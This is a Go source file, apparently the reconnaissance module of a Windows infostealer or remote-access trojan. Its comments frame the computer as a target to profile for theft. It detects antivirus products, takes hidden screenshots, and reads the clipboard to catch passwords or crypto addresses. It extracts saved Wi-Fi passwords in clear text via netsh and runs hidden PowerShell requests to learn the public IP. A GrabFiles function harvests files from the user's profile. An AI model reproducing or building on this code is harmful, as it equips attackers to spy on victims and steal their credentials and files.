package recon

/*
	System reconnaissance module

	Collects:
	- Basic system info (hostname, user, OS, etc)
	- Hardware info (CPU, RAM, GPU, disks)
	- Network info (IPs, MACs, gateways, wifi passwords)
	- Security software (AV detection)
	- Screenshot of desktop
	- Clipboard contents
	- Installed applications

	Some of this uses WMI queries which are slow af
	but gives more accurate info than registry parsing
*/

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/png"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"phantom/syscalls"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// SystemInfo - everything we collect about the target
type SystemInfo struct {
	ComputerName  string
	Username      string
	OS            string
	Architecture  string
	CPUCores      int
	RAM           string
	GPU           string
	Disks         []DiskInfo
	Network       []NetworkInfo
	PublicIP      string
	GeoIP         string // city/country from IP
	Uptime        string
	AntiVirus     []string
	InstalledApps []string
	RunningProcs  []string
	Screenshot    []byte // PNG encoded
	ClipboardData string
	WifiPasswords []WifiPassword
}

type DiskInfo struct {
	Drive      string
	TotalSpace uint64
	FreeSpace  uint64
	FileSystem string
}

type NetworkInfo struct {
	Interface string
	IP        string
	MAC       string
	Gateway   string
}

type WifiPassword struct {
	SSID     string
	Password string
}

// Win32 API stuff for screenshots
var (
	user32   = syscall.NewLazyDLL("user32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	// user32 procs
	procGetDC            = user32.NewProc("GetDC")
	procReleaseDC        = user32.NewProc("ReleaseDC")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")
	procOpenClipboard    = user32.NewProc("OpenClipboard")
	procCloseClipboard   = user32.NewProc("CloseClipboard")
	procGetClipboardData = user32.NewProc("GetClipboardData")

	// gdi32 procs - for screenshot
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procGetDIBits              = gdi32.NewProc("GetDIBits")

	// kernel32 procs
	procGlobalLock   = kernel32.NewProc("GlobalLock")
	procGlobalUnlock = kernel32.NewProc("GlobalUnlock")
)

// constants for Win32 API
const (
	SM_CXSCREEN = 0          // screen width
	SM_CYSCREEN = 1          // screen height
	SRCCOPY     = 0x00CC0020 // bitblt raster op
	CF_TEXT     = 1          // clipboard text format
	BI_RGB      = 0          // uncompressed bitmap
)

// Collect - main entry point, gathers all system info
func Collect() *SystemInfo {
	info := &SystemInfo{}

	// basic stuff first - these are fast
	info.ComputerName, _ = os.Hostname()
	info.Username = os.Getenv("USERNAME")
	info.OS = runtime.GOOS
	info.Architecture = runtime.GOARCH
	info.CPUCores = runtime.NumCPU()

	// memory info
	memStatus, _ := syscalls.GetMemoryStatus()
	if memStatus != nil {
		info.RAM = formatBytes(memStatus.TotalPhys)
	}

	// GPU - uses WMI which is slow but works
	info.GPU = getGPU()

	// disk info - all drives
	info.Disks = getDisks()

	// network interfaces + IPs
	info.Network = getNetworkInfo()
	info.PublicIP = getPublicIP() // makes external HTTP request

	// system uptime
	uptime := syscalls.GetTickCount64()
	info.Uptime = formatDuration(time.Duration(uptime) * time.Millisecond)

	// detect AV software
	// knowing what AV they have is useful
	info.AntiVirus = getAntiVirus()

	// installed programs
	info.InstalledApps = getInstalledApps()

	// running processes
	info.RunningProcs, _ = syscalls.EnumProcesses()

	// take a screenshot - people sometimes have passwords visible lol
	info.Screenshot = takeScreenshot()

	// grab clipboard - might have passwords or crypto addresses
	info.ClipboardData = getClipboard()

	// wifi passwords - requires admin to get via netsh
	// but often works anyway
	info.WifiPasswords = getWifiPasswords()

	return info
}

// getGPU - gets GPU name via WMI
// slow but more reliable than registry parsing
func getGPU() string {
	cmd := exec.Command("wmic", "path", "win32_videocontroller", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return "Unknown"
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && line != "Name" {
			return line
		}
	}

	return "Unknown"
}

func getDisks() []DiskInfo {
	var disks []DiskInfo

	for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
		drivePath := string(drive) + ":\\"

		h := kernel32.NewProc("GetDiskFreeSpaceExW")
		var freeBytesAvailable, totalBytes, totalFreeBytes uint64

		drivePtr, _ := syscall.UTF16PtrFromString(drivePath)
		ret, _, _ := h.Call(
			uintptr(unsafe.Pointer(drivePtr)),
			uintptr(unsafe.Pointer(&freeBytesAvailable)),
			uintptr(unsafe.Pointer(&totalBytes)),
			uintptr(unsafe.Pointer(&totalFreeBytes)),
		)

		if ret != 0 {
			disks = append(disks, DiskInfo{
				Drive:      drivePath,
				TotalSpace: totalBytes,
				FreeSpace:  totalFreeBytes,
			})
		}
	}

	return disks
}

func getNetworkInfo() []NetworkInfo {
	var networks []NetworkInfo

	interfaces, err := net.Interfaces()
	if err != nil {
		return networks
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					networks = append(networks, NetworkInfo{
						Interface: iface.Name,
						IP:        ipnet.IP.String(),
						MAC:       iface.HardwareAddr.String(),
					})
				}
			}
		}
	}

	return networks
}

func getPublicIP() string {
	// using multiple free services for reliability
	services := []string{
		"https://api.ipify.org",
		"https://icanhazip.com",
		"https://ifconfig.me/ip",
	}

	for _, service := range services {
		cmd := exec.Command("powershell", "-Command", fmt.Sprintf("(Invoke-WebRequest -Uri '%s' -UseBasicParsing).Content", service))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.Output()
		if err == nil {
			return strings.TrimSpace(string(output))
		}
	}

	return "Unknown"
}

func getAntiVirus() []string {
	var avList []string

	cmd := exec.Command("wmic", "/namespace:\\\\root\\securitycenter2", "path", "antivirusproduct", "get", "displayname")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return avList
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && line != "displayName" {
			avList = append(avList, line)
		}
	}

	return avList
}

func getInstalledApps() []string {
	var apps []string

	cmd := exec.Command("wmic", "product", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return apps
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && line != "Name" {
			apps = append(apps, line)
		}
	}

	return apps
}

func takeScreenshot() []byte {
	width, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	height, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)

	if width == 0 || height == 0 {
		return nil
	}

	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return nil
	}
	defer procReleaseDC.Call(0, hdcScreen)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil
	}
	defer procDeleteDC.Call(hdcMem)

	hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdcScreen, width, height)
	if hBitmap == 0 {
		return nil
	}
	defer procDeleteObject.Call(hBitmap)

	procSelectObject.Call(hdcMem, hBitmap)
	procBitBlt.Call(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)

	// get bitmap data
	type BITMAPINFOHEADER struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}

	bmi := BITMAPINFOHEADER{
		BiSize:        40,
		BiWidth:       int32(width),
		BiHeight:      -int32(height), // top-down
		BiPlanes:      1,
		BiBitCount:    32,
		BiCompression: BI_RGB,
	}

	imageSize := int(width) * int(height) * 4
	pixels := make([]byte, imageSize)

	procGetDIBits.Call(
		hdcMem,
		hBitmap,
		0,
		height,
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bmi)),
		0,
	)

	// convert BGRA to RGBA
	for i := 0; i < len(pixels); i += 4 {
		pixels[i], pixels[i+2] = pixels[i+2], pixels[i]
	}

	// create image
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	copy(img.Pix, pixels)

	// encode to PNG
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil
	}

	return buf.Bytes()
}

func getClipboard() string {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer procCloseClipboard.Call()

	h, _, _ := procGetClipboardData.Call(CF_TEXT)
	if h == 0 {
		return ""
	}

	ptr, _, _ := procGlobalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlock.Call(h)

	// read null-terminated string
	data := (*[1 << 20]byte)(unsafe.Pointer(ptr))
	var text []byte
	for i := 0; i < len(data); i++ {
		if data[i] == 0 {
			break
		}
		text = append(text, data[i])
	}

	return string(text)
}

func getWifiPasswords() []WifiPassword {
	var passwords []WifiPassword

	// get all wifi profiles
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err != nil {
		return passwords
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "All User Profile") || strings.Contains(line, "Profil") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				ssid := strings.TrimSpace(parts[1])
				if ssid == "" {
					continue
				}

				// get password for this profile
				cmd := exec.Command("netsh", "wlan", "show", "profile", ssid, "key=clear")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				output, err := cmd.Output()
				if err != nil {
					continue
				}

				profileLines := strings.Split(string(output), "\n")
				for _, profileLine := range profileLines {
					if strings.Contains(profileLine, "Key Content") || strings.Contains(profileLine, "Contenu") {
						parts := strings.Split(profileLine, ":")
						if len(parts) >= 2 {
							password := strings.TrimSpace(parts[1])
							passwords = append(passwords, WifiPassword{
								SSID:     ssid,
								Password: password,
							})
						}
					}
				}
			}
		}
	}

	return passwords
}

func formatBytes(b uint64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := uint64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}

func formatDuration(d time.Duration) string {
	days := d / (24 * time.Hour)
	d -= days * 24 * time.Hour
	hours := d / time.Hour
	d -= hours * time.Hour
	minutes := d / time.Minute

	return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
}

// GrabFiles grabs files matching extensions from common user directories
func GrabFiles(extensions []string, maxSize int64, paths []string) []GrabbedFile {
	var files []GrabbedFile
	userProfile := os.Getenv("USERPROFILE")

	for _, path := range paths {
		fullPath := filepath.Join(userProfile, path)
		if _, err := os.Stat(fullPath); os.IsNotExist(err) {
			continue
		}

		filepath.Walk(fullPath, func(p string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.IsDir() {
				return nil
			}

			if info.Size() > maxSize {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(info.Name()))
			for _, targetExt := range extensions {
				if ext == targetExt {
					content, err := os.ReadFile(p)
					if err != nil {
						return nil
					}

					relPath, _ := filepath.Rel(userProfile, p)
					files = append(files, GrabbedFile{
						Path:    relPath,
						Content: content,
					})
					break
				}
			}

			return nil
		})
	}

	return files
}

type GrabbedFile struct {
	Path    string
	Content []byte
}

// EncodeScreenshot encodes screenshot to base64
func EncodeScreenshot(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}
